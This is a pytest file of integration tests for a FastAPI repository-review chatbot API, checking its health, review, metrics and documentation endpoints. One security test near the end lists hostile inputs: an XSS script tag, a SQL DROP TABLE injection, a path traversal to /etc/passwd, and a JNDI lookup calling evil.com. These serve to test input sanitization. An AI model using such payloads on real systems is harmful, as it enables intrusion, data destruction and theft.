"""Comprehensive API integration tests for FastAPI endpoints."""

import pytest
import json
import tempfile
import os
import shutil
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch, MagicMock

# API will be imported inside test methods to ensure session fixture is applied first


class TestAPIEndpoints:
    """Test FastAPI endpoint functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        # Import API inside setup to ensure session fixture is applied
        from api import app
        self.client = TestClient(app)
        self.temp_dir = tempfile.mkdtemp()
        
        # Create test repository
        with open(os.path.join(self.temp_dir, "main.py"), "w") as f:
            f.write('''
def hello_world():
    """A simple hello world function."""
    print("Hello, World!")
    return "Hello, World!"

if __name__ == "__main__":
    hello_world()
''')
    
    def teardown_method(self):
        """Clean up test fixtures."""
        shutil.rmtree(self.temp_dir)
    
    def test_health_check_endpoint(self):
        """Test health check endpoint."""
        response = self.client.get("/health")

        assert response.status_code == 200
        data = response.json()
        assert "status" in data
        assert "timestamp" in data
        assert "service" in data
        assert data["service"] == "CustomLangGraphChatBot API"
    
    def test_review_endpoint_success(self):
        """Test successful repository review."""
        # Mock the nodes to return the expected analysis results
        with patch('workflow.start_review_node') as mock_start, \
             patch('workflow.analyze_code_node') as mock_analyze, \
             patch('workflow.generate_report_node') as mock_generate:

            # Mock node functions to return proper state updates
            async def mock_start_node(state):
                return {"current_step": "analyze_code"}

            async def mock_analyze_node(state):
                return {"current_step": "generate_report"}

            async def mock_generate_node(state):
                return {
                    "current_step": "completed",
                    "analysis_results": {
                        "repository_url": self.temp_dir,
                        "summary": {
                            "total_tools": 3,
                            "successful_tools": 3,
                            "total_issues": 2
                        },
                        "detailed_results": [],
                        "recommendations": ["Add more tests"]
                    }
                }

            mock_start.side_effect = mock_start_node
            mock_analyze.side_effect = mock_analyze_node
            mock_generate.side_effect = mock_generate_node

            request_data = {
                "repository_url": self.temp_dir
            }

            response = self.client.post("/review", json=request_data)

            assert response.status_code == 200
            data = response.json()
            assert "report" in data
            assert data["report"]["repository_url"] == self.temp_dir
    
    def test_review_endpoint_validation_errors(self):
        """Test repository review with validation errors."""
        # Test missing repository_url
        request_data = {}

        response = self.client.post("/review", json=request_data)
        assert response.status_code == 422  # Validation error

        # Test invalid request format
        response = self.client.post("/review", data="invalid json")
        assert response.status_code == 422  # Validation error
    
    def test_review_endpoint_with_github_url(self):
        """Test repository review with GitHub URL."""
        with patch('workflow.start_review_node') as mock_start, \
             patch('workflow.analyze_code_node') as mock_analyze, \
             patch('workflow.generate_report_node') as mock_generate:

            # Mock node functions to return proper state updates
            async def mock_start_node(state):
                return {"current_step": "analyze_code"}

            async def mock_analyze_node(state):
                return {"current_step": "generate_report"}

            async def mock_generate_node(state):
                return {
                    "current_step": "completed",
                    "analysis_results": {
                        "status": "success",
                        "repository_url": "https://github.com/test/repo"
                    }
                }

            mock_start.side_effect = mock_start_node
            mock_analyze.side_effect = mock_analyze_node
            mock_generate.side_effect = mock_generate_node

            request_data = {
                "repository_url": "https://github.com/test/repo"
            }

            response = self.client.post("/review", json=request_data)

            assert response.status_code == 200
            data = response.json()
            assert "report" in data
            assert data["report"]["status"] == "success"
    
    def test_root_endpoint(self):
        """Test root endpoint."""
        response = self.client.get("/")

        assert response.status_code == 200
        data = response.json()
        assert "message" in data
        assert "version" in data
        assert "endpoints" in data
        assert data["message"] == "CustomLangGraphChatBot API"
        assert data["version"] == "1.0.0"
    
    def test_metrics_endpoint(self):
        """Test metrics endpoint."""
        response = self.client.get("/metrics")

        assert response.status_code == 200
        data = response.json()
        assert "system" in data
        assert "api" in data
        assert "tools" in data
        assert "timestamp" in data
    
    def test_api_metrics_endpoint(self):
        """Test API-specific metrics endpoint."""
        response = self.client.get("/metrics/api")

        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, dict)
    
    def test_tool_metrics_endpoint(self):
        """Test tool-specific metrics endpoint."""
        response = self.client.get("/metrics/tools")

        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, dict)
    
    def test_system_metrics_endpoint(self):
        """Test system-specific metrics endpoint."""
        response = self.client.get("/metrics/system")

        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, dict)
    
    def test_recent_events_endpoint(self):
        """Test recent events endpoint."""
        response = self.client.get("/events/recent")

        assert response.status_code == 200
        data = response.json()
        assert "events" in data
        assert "timestamp" in data
        assert isinstance(data["events"], list)
    
    def test_error_summary_endpoint(self):
        """Test error summary endpoint."""
        response = self.client.get("/errors/summary")

        assert response.status_code == 200
        data = response.json()
        assert "summary" in data
        assert "timestamp" in data
    
    def test_cors_headers(self):
        """Test CORS headers are properly set."""
        response = self.client.get("/health")

        # Check that CORS headers are present (if CORS is configured)
        # Note: CORS headers may only be present in actual cross-origin requests
        # For now, just verify the request succeeds
        assert response.status_code == 200
    
    def test_request_validation(self):
        """Test request validation for various endpoints."""
        # Test review endpoint with invalid JSON
        response = self.client.post(
            "/review",
            data="invalid json",
            headers={"Content-Type": "application/json"}
        )
        assert response.status_code == 422

        # Test review endpoint with missing parameters
        response = self.client.post("/review", json={})
        assert response.status_code == 422
    
    def test_error_handling_in_endpoints(self):
        """Test error handling in API endpoints."""
        with patch('workflow.start_review_node') as mock_start, \
             patch('workflow.analyze_code_node') as mock_analyze, \
             patch('workflow.generate_report_node') as mock_generate:

            # Mock workflow to raise an exception
            mock_start.side_effect = Exception("Workflow error")

            request_data = {
                "repository_url": self.temp_dir
            }

            response = self.client.post("/review", json=request_data)

            # Should handle the error gracefully
            assert response.status_code == 500
            data = response.json()
            assert "detail" in data
    
    def test_large_request_handling(self):
        """Test handling of large requests."""
        # Create a request with a very long repository URL
        long_url = "https://github.com/test/" + "a" * 1000 + "/repo"

        request_data = {
            "repository_url": long_url
        }

        with patch('workflow.start_review_node') as mock_start, \
             patch('workflow.analyze_code_node') as mock_analyze, \
             patch('workflow.generate_report_node') as mock_generate:

            # Mock node functions to return proper state updates
            async def mock_start_node(state):
                return {"current_step": "analyze_code"}

            async def mock_analyze_node(state):
                return {"current_step": "generate_report"}

            async def mock_generate_node(state):
                return {
                    "current_step": "completed",
                    "analysis_results": {"status": "success"}
                }

            mock_start.side_effect = mock_start_node
            mock_analyze.side_effect = mock_analyze_node
            mock_generate.side_effect = mock_generate_node

            response = self.client.post("/review", json=request_data)

            # Should handle large requests
            assert response.status_code == 200
    
    def test_concurrent_requests(self):
        """Test handling of concurrent requests."""
        import threading
        import time
        
        results = []
        
        def make_request():
            response = self.client.get("/health")
            results.append(response.status_code)
        
        # Make multiple concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All requests should succeed
        assert all(status == 200 for status in results)
        assert len(results) == 10
    
    def test_response_format_consistency(self):
        """Test that API responses have consistent format."""
        # Test health endpoint
        response = self.client.get("/health")
        data = response.json()
        assert isinstance(data, dict)
        assert "status" in data

        # Test metrics endpoint
        response = self.client.get("/metrics")
        data = response.json()
        assert isinstance(data, dict)
        assert "system" in data
        assert "api" in data
        assert "tools" in data

        # Test root endpoint
        response = self.client.get("/")
        data = response.json()
        assert isinstance(data, dict)
        assert "message" in data
        assert "endpoints" in data
    
    def test_api_documentation_endpoints(self):
        """Test API documentation endpoints."""
        # Test OpenAPI schema
        response = self.client.get("/openapi.json")
        assert response.status_code == 200
        
        # Test docs endpoint
        response = self.client.get("/docs")
        assert response.status_code == 200
        
        # Test redoc endpoint
        response = self.client.get("/redoc")
        assert response.status_code == 200


class TestAPIAuthentication:
    """Test API authentication and security."""
    
    def setup_method(self):
        """Set up test fixtures."""
        # Import API inside setup to ensure session fixture is applied
        from api import app
        self.client = TestClient(app)
    
    def test_api_without_authentication(self):
        """Test API access without authentication."""
        # Currently the API doesn't require authentication
        # This test ensures endpoints are accessible
        response = self.client.get("/health")
        assert response.status_code == 200
    
    def test_rate_limiting(self):
        """Test rate limiting if implemented."""
        # Make many requests quickly
        responses = []
        for _ in range(100):
            response = self.client.get("/health")
            responses.append(response.status_code)
        
        # Should either all succeed or implement rate limiting
        assert all(status in [200, 429] for status in responses)
    
    def test_input_sanitization(self):
        """Test input sanitization for security."""
        with patch('workflow.start_review_node') as mock_start, \
             patch('workflow.analyze_code_node') as mock_analyze, \
             patch('workflow.generate_report_node') as mock_generate:

            # Mock node functions to return proper state updates
            async def mock_start_node(state):
                return {"current_step": "analyze_code"}

            async def mock_analyze_node(state):
                return {"current_step": "generate_report"}

            async def mock_generate_node(state):
                return {
                    "current_step": "completed",
                    "analysis_results": {"status": "sanitized"}
                }

            mock_start.side_effect = mock_start_node
            mock_analyze.side_effect = mock_analyze_node
            mock_generate.side_effect = mock_generate_node

            malicious_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
            ]

            for malicious_input in malicious_inputs:
                request_data = {
                    "repository_url": malicious_input
                }

                response = self.client.post("/review", json=request_data)

                # Should either reject, sanitize malicious input, or process successfully with mocked workflow
                assert response.status_code in [200, 400, 422, 500]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
